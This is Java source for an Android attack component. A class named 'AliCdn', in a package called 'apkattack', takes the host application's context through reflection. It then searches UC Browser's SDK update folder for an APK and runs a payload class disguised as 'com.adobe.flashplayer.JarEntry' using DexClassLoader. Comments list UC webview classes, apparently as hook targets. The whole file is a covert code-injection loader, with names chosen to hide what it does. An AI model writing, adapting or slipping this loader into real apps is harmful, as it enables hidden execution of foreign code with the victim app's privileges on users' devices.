package com.example.apkattack;

import java.io.File;
import java.lang.reflect.Method;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;


//sdk_shell.jar
//Lcom/uc/webview/browser/shell/NativeLibraries;
//Lcom/uc/webview/browser/shell/SdkAuthentication;

//browser_if.jar
//Lcom/uc/webview/browser/BrowserCore;
//Lcom/uc/webview/browser/NotificationPermissions;
//Lcom/uc/media/interfaces/PlayerType;


//core.jar
//Lcom/uc/core/stat/StatServices;
//Lcom/uc/core/stat/StatsUtil;
//Lcom/UCMobile/Apollo/UCLibraryLoader;
//Lcom/UCMobile/Apollo/Settings;
public class AliCdn {

	public static void alicdnEntryWithoutContext(){
    	String Tag = "alicdnEntryWithoutContext";
    	try {
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
	        
	        

    		String apppath = context.getFilesDir().getParent() + "/";
    		//String apptpath = "/data/data/com.UCMobile/";
	    	String dexmethodname = "start";
	    	//String cfgfn = "ark.dat";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	
	    	String nextpath = apppath + "app_ucmsdk/updates/";
	    	File [] nextpathfiles = new File(nextpath).listFiles();
	    	if (nextpathfiles == null || nextpathfiles.length <= 0) {
				Log.e(Tag,"not found files int next path");
				return;
			}
	    	String nextnextpath = nextpath + nextpathfiles[0].getName() + "/";
	    	
	    	File [] nextnextpathfiles = new File(nextnextpath).listFiles();
	    	if (nextnextpathfiles == null || nextnextpathfiles.length <= 0) {
				Log.e(Tag,"not found files int next next path");
				return;
			}
	    	String nextnextnextpath = nextnextpath + nextnextpathfiles[0].getName() + "/";
	    	
	    	String apkfpath = nextnextnextpath + "assets/";
	    	
	    	String apkfilename = "";
	    	File [] assetsfiles = new File(apkfpath).listFiles();
	    	for (int i = 0; i < assetsfiles.length; i++) {
				if(assetsfiles[i].getName().endsWith(".apk")){
					apkfilename = assetsfiles[i].getAbsolutePath();
					break;
				}
			}
	    	
	    	if (apkfilename == null || apkfilename.equals("")) {
	    		Log.e(Tag,"not found apk files int the assets path");
				return;
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
	    	DexClassLoader dexcl = new DexClassLoader(apkfilename, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "load apk exception");
    	}
	}
}
